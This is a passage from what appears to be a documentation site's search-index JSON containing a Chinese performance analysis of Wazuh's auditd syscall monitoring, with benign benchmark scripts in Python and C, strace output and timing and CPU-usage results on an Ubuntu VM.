\"ram\": {\n         \"free\": 3167704,\n         \"total\": 4002256,\n         \"usage\": 21\n      }\n}\n\n\n\n\n\n3.\u6d4b\u8bd5\n\n\n\u6d4b\u8bd5\u4e00\n\n\n\u6d4b\u8bd5\u65b9\u6848\uff1a\u5bf9\u6bd4\u5f00\u542f\u5ba1\u8ba1\u524d\u540e\uff0c\u6267\u884c\u76f8\u540c\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u65f6\u95f4\u3002\u6d4b\u8bd5\u7a0b\u5e8f(\u5f00\u542f\u5b50\u8fdb\u7a0b\u6267\u884c\u82e5\u5e72\u6b21 cat call_syscalls.py > /dev/null \u547d\u4ee4): \n\n\n# python3\n# call_syscalls.py\nimport subprocess\nimport sys\nimport time\n\ndef main():\n    loop = int(sys.argv[1]) if len(sys.argv) > 1 else 3000\n    start_time = time.time()\n    for i in range(loop):\n        cmd = \"cat {} >/dev/null\".format(sys.argv[0])\n        proc = subprocess.Popen(cmd, shell=True)\n        proc.wait()\n    end_time = time.time()\n    print('Done after {}s.'.format(int(end_time - start_time)))\n\n\nif __name__ == '__main__':\n    main()\n\n\n\n\n\n\u6267\u884c\u4e00\u6b21\u7684\u7cfb\u7edf\u8c03\u7528\u7edf\u8ba1\u60c5\u51b5\uff1a\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# strace -f -c -o strace_log python3 call_syscalls.py 1\nDone after 0s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# cat strace_log \n% time     seconds  usecs/call     calls    errors syscall\n------ ----------- ----------- --------- --------- ----------------\n 41.49    0.000407           2       230        33 stat\n 19.16    0.000188           2        83         2 openat\n 12.84    0.000126           6        21           brk\n  9.28    0.000091           1       119           read\n  6.01    0.000059           0       136           fstat\n  5.10    0.000050           1        91           close\n  3.06    0.000030           0        61         6 lseek\n  2.45    0.000024           1        20           getdents\n  0.61    0.000006           0        58           mmap\n  0.00    0.000000           0         2           write\n  0.00    0.000000           0         9           lstat\n  0.00    0.000000           0        24           mprotect\n  0.00    0.000000           0        16           munmap\n  0.00    0.000000           0        77           rt_sigaction\n  0.00    0.000000           0         1           rt_sigprocmask\n  0.00    0.000000           0         1           rt_sigreturn\n  0.00    0.000000           0        14         3 ioctl\n  0.00    0.000000           0        15        15 access\n  0.00    0.000000           0         3           dup\n  0.00    0.000000           0         2           dup2\n  0.00    0.000000           0         2           getpid\n  0.00    0.000000           0         2           clone\n  0.00    0.000000           0         3           execve\n  0.00    0.000000           0         2           wait4\n  0.00    0.000000           0         5           fcntl\n  0.00    0.000000           0         1           getcwd\n  0.00    0.000000           0         4         2 readlink\n  0.00    0.000000           0         1           sysinfo\n  0.00    0.000000           0         2           getuid\n  0.00    0.000000           0         2           getgid\n  0.00    0.000000           0         3           geteuid\n  0.00    0.000000           0         2           getegid\n  0.00    0.000000           0         1           getppid\n  0.00    0.000000           0         3           sigaltstack\n  0.00    0.000000           0         3           arch_prctl\n  0.00    0.000000           0         1           futex\n  0.00    0.000000           0         2           getdents64\n  0.00    0.000000           0         1           set_tid_address\n  0.00    0.000000           0         1           fadvise64\n  0.00    0.000000           0         2           set_robust_list\n  0.00    0.000000           0         1           pipe2\n  0.00    0.000000           0         1           prlimit64\n  0.00    0.000000           0         1           getrandom\n------ ----------- ----------- --------- --------- ----------------\n100.00    0.000981                  1029        61 total\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# \n\n\n\n\n\n\u8f85\u52a9\u7a0b\u5e8f(\u7528\u4e8e\u8bbe\u7f6e\u548c\u5220\u9664\u5ba1\u8ba1\u7684\u89c4\u5219\uff0c\u5bf9\u6240\u6709\u7cfb\u7edf\u8c03\u7528\u505a\u76d1\u63a7):\n\n\n# python3\n# test_ctl.py\nimport subprocess\nimport sys\n\ndef start():\n    audit_cmd = \"auditctl -a always,exit -F arch=b64 -F key=audit-wazuh-c -S \"\n    res = subprocess.check_output(\"ausyscall --dump\", shell=True).decode()\n    audit_cmd += \",\".join(line.split()[1] for line in res.split('\\n')[1:] if line.strip())\n    proc = subprocess.Popen(audit_cmd, shell=True)\n    proc.wait()\n    print(subprocess.check_output(\"auditctl -l\", shell=True).decode())\n\n\ndef stop():\n    proc = subprocess.Popen(\"auditctl -D\", shell=True)\n    proc.wait()\n\n\n\ndef main():\n    if len(sys.argv) > 1:\n        if sys.argv[1] == \"start\":\n            print(\"Start\")\n            start()\n        elif sys.argv[1] == \"stop\":\n            print(\"Stop\")\n            stop()\n        else:\n            exit()\n    else:\n        exit()\n\n\nif __name__ == '__main__':\n    main()\n\n\n\n\n\n\u6267\u884c\u6d4b\u8bd5\uff1a\n\n\n1.\u4e0d\u5f00\u542f\u5ba1\u8ba1\uff0c\u4e0d\u542f\u52a8wazuh Agent\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# auditctl -l\nNo rules\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# service wazuh-agent stop\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 7s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# \n\n\n\n\n\n\u6267\u884c5000\u6b21\u5faa\u73af\uff0c5\u6b21\u7684\u5e73\u5747\u6267\u884c\u65f6\u95f4\u4e3a6.2\u79d2\n\n\n2.\u5f00\u542f\u5ba1\u8ba1\uff0c\u76d1\u63a7\u6240\u6709\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u5f00\u542fwazuh Agent\u7684\u7cfb\u7edf\u8c03\u7528\u76d1\u63a7\u529f\u80fd(\u5df2\u7ecf\u63d0\u53d6\u914d\u7f6e\u597d)\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# service wazuh-agent start\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 test_ctl.py start\nStart\n-a always,exit -F arch=b64 -S read,write,open,close,stat,fstat,lstat,poll,lseek,mmap,mprotect,munmap,brk,rt_sigaction,rt_sigprocmask,rt_sigreturn,ioctl,pread,pwrite,readv,writev,access,pipe,select,sched_yield,mremap,msync,mincore,madvise,shmget,(\u7701\u7565...),statx -F key=audit-wazuh-c\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 39s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 40s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 40s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 38s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 34s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools\n\n\n\n\n\n\u6267\u884c5000\u6b21\u5faa\u73af\uff0c5\u6b21\u7684\u5e73\u5747\u6267\u884c\u65f6\u95f4\u4e3a38.2\u79d2\n\n\n3.\u5728\u7b2c\u4e8c\u6b21\u7684\u57fa\u7840\u4e0a\u5173\u95edwazuh agent\u670d\u52a1(\u53ea\u5f00\u542f\u5ba1\u8ba1\u7684\u76d1\u63a7\u7cfb\u7edf\u8c03\u7528\u529f\u80fd)\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# service wazuh-agent stop\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 33s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 32s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 30s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 30s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 31s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# \n\n\n\n\n\n\u6267\u884c5000\u6b21\u5faa\u73af\uff0c5\u6b21\u7684\u5e73\u5747\u6267\u884c\u65f6\u95f4\u4e3a31.2\u79d2\n\n\n\u6d4b\u8bd5\u4e8c\n\n\n\u6d4b\u8bd5\u65b9\u6848\uff1a\u4e0e\u6d4b\u8bd5\u4e00\u76f8\u540c\uff0c\u533a\u522b\u662f\u628a\u6d4b\u8bd5\u7a0b\u5e8f\u6539\u4e3aC\u8bed\u8a00\u7a0b\u5e8f\uff0c\u6d4b\u8bd5opne\u3001read\u3001close\u4e09\u4e2a\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u8017\n\n\n\u6d4b\u8bd5\u7a0b\u5e8f\uff1a\n\n\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/time.h>\n\nint main(){\n    struct timeval start;\n    struct timeval end;\n    long time_use = 0;\n\n    gettimeofday(&start,NULL);\n    for(int i=0;i<1000000;i++){\n        char tmp[10];\n        int fd = open(\"run.c\", O_RDWR);\n        if(read(fd, tmp, 10) != 10){\n            printf(\"error\\n\");\n            return -1;\n        }\n        if(close(fd) != 0){\n            printf(\"error\\n\");\n            return -1;\n        }\n    }\n    gettimeofday(&end,NULL);\n    time_use= end.tv_sec - start.tv_sec;\n    printf(\"Done after %lds\\n\", time_use);\n}\n\n\n\n\n\n\u8fd0\u884c\u7ed3\u679c\uff1a\n\n\n\u5f00\u542f\u5ba1\u8ba1\u524d\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 5s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 5s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 5s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 6s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 7s\n\n\n\n\n\n\u5f00\u542f\u5ba1\u8ba1\u540e\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 19s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 20s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 21s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 21s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 21s\n\n\n\n\n\n\u6027\u80fd\u635f\u5931\u7387\uff1a70.0%\n\n\n\u6d4b\u8bd5\u4e09\n\n\n\u6d4b\u8bd5\u65b9\u6848\uff1a\u4e0e\u6d4b\u8bd5\u4e00\u76f8\u540c\uff0c\u533a\u522b\u662f\u628a\u6d4b\u8bd5\u7a0b\u5e8f\u6539\u4e3aC\u8bed\u8a00\u7a0b\u5e8f\uff0c\u6d4b\u8bd5mmap\u548cmunmap\u4e24\u4e2a\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u8017\n\n\n\u6d4b\u8bd5\u7a0b\u5e8f\uff1a\n\n\n#include <sys/types.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <stdio.h>\n#include <sys/time.h>\n\n\nint main(){\n    struct timeval start;\n    struct timeval end;\n    float time_use = 0;\n\n    int fd = open(\"run_mmap.c\", O_RDONLY);\n    if(fd < 0){\n        printf(\"error\\n\");\n        return -1;\n    }\n\n\n    gettimeofday(&start,NULL);\n    for(int i; i<20000000; i++){\n\n\n        void *addr = mmap(NULL, 10, PROT_READ, MAP_PRIVATE, fd, 0);\n        if(addr == MAP_FAILED){\n            printf(\"error\\n\");\n            return -1;\n        }\n        if(munmap(addr, 10) != 0){\n            printf(\"error\\n\");\n            return -1;\n        }\n\n    }\n    gettimeofday(&end,NULL);\n    time_use=(end.tv_sec-start.tv_sec)*1000000+(end.tv_usec-start.tv_usec);\n    //time_use= end.tv_sec-start.tv_sec;\n    if(close(fd) != 0){\n        printf(\"error\\n\");\n        return -1;\n    }\n    printf(\"Done after %f\u03bcs\\n\", time_use);\n\n}\n\n\n\n\n\n\u5f00\u542f\u5ba1\u8ba1\u524d:\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 18826420.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 19980384.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 19807356.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 21779724.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 21440176.000000\u03bcs\n\n\n\n\n\n\u5f00\u542f\u5ba1\u8ba1\u540e\uff1a\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 80555072.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 75856544.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 81079392.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 90686256.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 78594544.000000\u03bcs\n\n\n\n\n\n\n\u6027\u80fd\u635f\u5931\u7387\uff1a75.0%\n\n\n\u6d4b\u8bd5\u56db\n\n\n\u6d4b\u8bd5\u65b9\u6848\uff1a\u5728\u6d4b\u8bd5\u4e00\u7ed3\u8bba\u57fa\u7840\u4e0a\uff0c\u4f7f\u7528vmstat\u5bf9\u6bd4CPU\u4f7f\u7528\u7387\n\u6267\u884c\u6d4b\u8bd5\uff1a\n1.\u4e0d\u5f00\u542f\u5ba1\u8ba1\uff0c\u4e0d\u542f\u52a8wazuh Agent\n\u672c\u6b21\u6d4b\u8bd5\u5171\u8fdb\u884c\u4e86\u56db\u6b21\uff0cvmstate\u7684\u7ed3\u679c\u5982\u4e0b:\n\u7b2c\u4e00\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c19.2%\uff0c\u5185\u6838\u600175.5%\n\u7b2c\u4e8c\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.4%\uff0c\u5185\u6838\u600174.2%\n\u7b2c\u4e09\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c25%\uff0c\u5185\u6838\u600174.5%\n\u7b2c\u56db\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.4%\uff0c\u5185\u6838\u600172.5%\n\n2.\u5f00\u542f\u5ba1\u8ba1\uff0c\u76d1\u63a7\u6240\u6709\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u5f00\u542fwazuh Agent\u7684\u7cfb\u7edf\u8c03\u7528\u76d1\u63a7\u529f\u80fd(\u5df2\u7ecf\u63d0\u53d6\u914d\u7f6e\u597d)\n\u672c\u6b21\u6d4b\u8bd5\u5171\u8fdb\u884c\u4e86\u56db\u6b21\uff0cvmstate\u7684\u7ed3\u679c\u5982\u4e0b:\n\u7b2c\u4e00\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c18%\uff0c\u5185\u6838\u600182%\n\u7b2c\u4e8c\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.5%\uff0c\u5185\u6838\u600178.5%\n\u7b2c\u4e09\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.2%\uff0c\u5185\u6838\u600182.5%\n\u7b2c\u56db\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c17.5%\uff0c\u5185\u6838\u600181.5%",
            "title": "Wazuh\u6027\u80fd\u5206\u6790"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#wazuh",
            "text": "",
            "title": "wazuh\u6027\u80fd\u5206\u6790"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#1",
            "text": "\u6d4b\u8bd5\u76ee\u6807\uff1a\u5206\u6790wazuh\u4f7f\u7528\u5ba1\u8ba1(auditd)\u8bb0\u5f55\u7cfb\u7edf\u8c03\u7528\u529f\u80fd\u7ed9\u7cfb\u7edf\u5e26\u6765\u7684\u6027\u80fd\u635f\u5931\u3002  \u7ed3\u8bba\u5982\u4e0b\uff1a   \u8fdb\u7a0b\u8fd0\u884c\u65f6\u8017\uff1a\u5f00\u542fwazuh\u7684\u5ba1\u8ba1\u8bb0\u5f55\u7cfb\u7edf\u8c03\u7528\u7684\u529f\u80fd\u540e\uff0c\u8fdb\u7a0b\u7684\u6267\u884c\u901f\u5ea6\u4f1a\u964d\u4f4e83.77%\u4e4b\u591a\uff0c\u4e14\u6027\u80fd\u635f\u5931\u4e3b\u8981\u6765\u81eaauditd\u3002  CPU\u5360\u7528\u7387\uff1a\u5728\u5355\u6838CPU\u7cfb\u7edf\u4e0a\uff0c\u7cfb\u7edf\u5185\u6838CPU\u5360\u7528\u7387\u5e73\u5747\u4f1a\u589e\u52a06.8%\uff0c\u7528\u6237\u6001\u57fa\u672c\u65e0\u5f71\u54cd   \u200b                 \u200b",
            "title": "1.\u6982\u8ff0"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#2",
            "text": "\u7cfb\u7edf\u4fe1\u606f:  \"data\": {\n      \"os\": {\n         \"codename\": \"Bionic Beaver\",\n         \"major\": \"18\",\n         \"minor\": \"04\",\n         \"name\": \"Ubuntu\",\n         \"platform\": \"ubuntu\",\n         \"version\": \"18.04.3 LTS (Bionic Beaver)\"\n      },\n      \"hostname\": \"ubuntu-virtual-machine\",\n      \"version\": \"#32~18.04.1-Ubuntu SMP Mon Feb 3 14:05:59 UTC 2020\",\n      \"architecture\": \"x86_64\",\n      \"release\": \"5.3.0-40-generic\",\n      \"sysname\": \"Linux\"\n}  \u786c\u4ef6\u4fe1\u606f:  \"data\": {\n      \"cpu\": {\n         \"cores\": 1,\n         \"mhz\": 2495.391,\n         \"name\": \"Intel(R) Core(TM) i7-7660U CPU @ 2.50GHz\"\n      },\n      \"ram\": {\n         \"free\": 3167704,\n         \"total\": 4002256,\n         \"usage\": 21\n      }\n}",
            "title": "2.\u73af\u5883"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#3",
            "text": "",
            "title": "3.\u6d4b\u8bd5"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#_1",
            "text": "\u6d4b\u8bd5\u65b9\u6848\uff1a\u5bf9\u6bd4\u5f00\u542f\u5ba1\u8ba1\u524d\u540e\uff0c\u6267\u884c\u76f8\u540c\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u65f6\u95f4\u3002\u6d4b\u8bd5\u7a0b\u5e8f(\u5f00\u542f\u5b50\u8fdb\u7a0b\u6267\u884c\u82e5\u5e72\u6b21 cat call_syscalls.py > /dev/null \u547d\u4ee4):   # python3\n# call_syscalls.py\nimport subprocess\nimport sys\nimport time\n\ndef main():\n    loop = int(sys.argv[1]) if len(sys.argv) > 1 else 3000\n    start_time = time.time()\n    for i in range(loop):\n        cmd = \"cat {} >/dev/null\".format(sys.argv[0])\n        proc = subprocess.Popen(cmd, shell=True)\n        proc.wait()\n    end_time = time.time()\n    print('Done after {}s.'.format(int(end_time - start_time)))\n\n\nif __name__ == '__main__':\n    main()  \u6267\u884c\u4e00\u6b21\u7684\u7cfb\u7edf\u8c03\u7528\u7edf\u8ba1\u60c5\u51b5\uff1a  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# strace -f -c -o strace_log python3 call_syscalls.py 1\nDone after 0s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# cat strace_log \n% time     seconds  usecs/call     calls    errors syscall\n------ ----------- ----------- --------- --------- ----------------\n 41.49    0.000407           2       230        33 stat\n 19.16    0.000188           2        83         2 openat\n 12.84    0.000126           6        21           brk\n  9.28    0.000091           1       119           read\n  6.01    0.000059           0       136           fstat\n  5.10    0.000050           1        91           close\n  3.06    0.000030           0        61         6 lseek\n  2.45    0.000024           1        20           getdents\n  0.61    0.000006           0        58           mmap\n  0.00    0.000000           0         2           write\n  0.00    0.000000           0         9           lstat\n  0.00    0.000000           0        24           mprotect\n  0.00    0.000000           0        16           munmap\n  0.00    0.000000           0        77           rt_sigaction\n  0.00    0.000000           0         1           rt_sigprocmask\n  0.00    0.000000           0         1           rt_sigreturn\n  0.00    0.000000           0        14         3 ioctl\n  0.00    0.000000           0        15        15 access\n  0.00    0.000000           0         3           dup\n  0.00    0.000000           0         2           dup2\n  0.00    0.000000           0         2           getpid\n  0.00    0.000000           0         2           clone\n  0.00    0.000000           0         3           execve\n  0.00    0.000000           0         2           wait4\n  0.00    0.000000           0         5           fcntl\n  0.00    0.000000           0         1           getcwd\n  0.00    0.000000           0         4         2 readlink\n  0.00    0.000000           0         1           sysinfo\n  0.00    0.000000           0         2           getuid\n  0.00    0.000000           0         2           getgid\n  0.00    0.000000           0         3           geteuid\n  0.00    0.000000           0         2           getegid\n  0.00    0.000000           0         1           getppid\n  0.00    0.000000           0         3           sigaltstack\n  0.00    0.000000           0         3           arch_prctl\n  0.00    0.000000           0         1           futex\n  0.00    0.000000           0         2           getdents64\n  0.00    0.000000           0         1           set_tid_address\n  0.00    0.000000           0         1           fadvise64\n  0.00    0.000000           0         2           set_robust_list\n  0.00    0.000000           0         1           pipe2\n  0.00    0.000000           0         1           prlimit64\n  0.00    0.000000           0         1           getrandom\n------ ----------- ----------- --------- --------- ----------------\n100.00    0.000981                  1029        61 total\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools#   \u8f85\u52a9\u7a0b\u5e8f(\u7528\u4e8e\u8bbe\u7f6e\u548c\u5220\u9664\u5ba1\u8ba1\u7684\u89c4\u5219\uff0c\u5bf9\u6240\u6709\u7cfb\u7edf\u8c03\u7528\u505a\u76d1\u63a7):  # python3\n# test_ctl.py\nimport subprocess\nimport sys\n\ndef start():\n    audit_cmd = \"auditctl -a always,exit -F arch=b64 -F key=audit-wazuh-c -S \"\n    res = subprocess.check_output(\"ausyscall --dump\", shell=True).decode()\n    audit_cmd += \",\".join(line.split()[1] for line in res.split('\\n')[1:] if line.strip())\n    proc = subprocess.Popen(audit_cmd, shell=True)\n    proc.wait()\n    print(subprocess.check_output(\"auditctl -l\", shell=True).decode())\n\n\ndef stop():\n    proc = subprocess.Popen(\"auditctl -D\", shell=True)\n    proc.wait()\n\n\n\ndef main():\n    if len(sys.argv) > 1:\n        if sys.argv[1] == \"start\":\n            print(\"Start\")\n            start()\n        elif sys.argv[1] == \"stop\":\n            print(\"Stop\")\n            stop()\n        else:\n            exit()\n    else:\n        exit()\n\n\nif __name__ == '__main__':\n    main()  \u6267\u884c\u6d4b\u8bd5\uff1a  1.\u4e0d\u5f00\u542f\u5ba1\u8ba1\uff0c\u4e0d\u542f\u52a8wazuh Agent  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# auditctl -l\nNo rules\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# service wazuh-agent stop\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 7s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 6s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools#   \u6267\u884c5000\u6b21\u5faa\u73af\uff0c5\u6b21\u7684\u5e73\u5747\u6267\u884c\u65f6\u95f4\u4e3a6.2\u79d2  2.\u5f00\u542f\u5ba1\u8ba1\uff0c\u76d1\u63a7\u6240\u6709\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u5f00\u542fwazuh Agent\u7684\u7cfb\u7edf\u8c03\u7528\u76d1\u63a7\u529f\u80fd(\u5df2\u7ecf\u63d0\u53d6\u914d\u7f6e\u597d)  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# service wazuh-agent start\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 test_ctl.py start\nStart\n-a always,exit -F arch=b64 -S read,write,open,close,stat,fstat,lstat,poll,lseek,mmap,mprotect,munmap,brk,rt_sigaction,rt_sigprocmask,rt_sigreturn,ioctl,pread,pwrite,readv,writev,access,pipe,select,sched_yield,mremap,msync,mincore,madvise,shmget,(\u7701\u7565...),statx -F key=audit-wazuh-c\n\n\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 39s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 40s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 40s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 38s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 34s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools  \u6267\u884c5000\u6b21\u5faa\u73af\uff0c5\u6b21\u7684\u5e73\u5747\u6267\u884c\u65f6\u95f4\u4e3a38.2\u79d2  3.\u5728\u7b2c\u4e8c\u6b21\u7684\u57fa\u7840\u4e0a\u5173\u95edwazuh agent\u670d\u52a1(\u53ea\u5f00\u542f\u5ba1\u8ba1\u7684\u76d1\u63a7\u7cfb\u7edf\u8c03\u7528\u529f\u80fd)  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# service wazuh-agent stop\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 33s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 32s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 30s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 30s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# python3 call_syscalls.py 5000\nDone after 31s.\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools#   \u6267\u884c5000\u6b21\u5faa\u73af\uff0c5\u6b21\u7684\u5e73\u5747\u6267\u884c\u65f6\u95f4\u4e3a31.2\u79d2",
            "title": "\u6d4b\u8bd5\u4e00"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#_2",
            "text": "\u6d4b\u8bd5\u65b9\u6848\uff1a\u4e0e\u6d4b\u8bd5\u4e00\u76f8\u540c\uff0c\u533a\u522b\u662f\u628a\u6d4b\u8bd5\u7a0b\u5e8f\u6539\u4e3aC\u8bed\u8a00\u7a0b\u5e8f\uff0c\u6d4b\u8bd5opne\u3001read\u3001close\u4e09\u4e2a\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u8017  \u6d4b\u8bd5\u7a0b\u5e8f\uff1a  #include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/time.h>\n\nint main(){\n    struct timeval start;\n    struct timeval end;\n    long time_use = 0;\n\n    gettimeofday(&start,NULL);\n    for(int i=0;i<1000000;i++){\n        char tmp[10];\n        int fd = open(\"run.c\", O_RDWR);\n        if(read(fd, tmp, 10) != 10){\n            printf(\"error\\n\");\n            return -1;\n        }\n        if(close(fd) != 0){\n            printf(\"error\\n\");\n            return -1;\n        }\n    }\n    gettimeofday(&end,NULL);\n    time_use= end.tv_sec - start.tv_sec;\n    printf(\"Done after %lds\\n\", time_use);\n}  \u8fd0\u884c\u7ed3\u679c\uff1a  \u5f00\u542f\u5ba1\u8ba1\u524d  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 5s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 5s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 5s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 6s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run \nDone after 7s  \u5f00\u542f\u5ba1\u8ba1\u540e  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 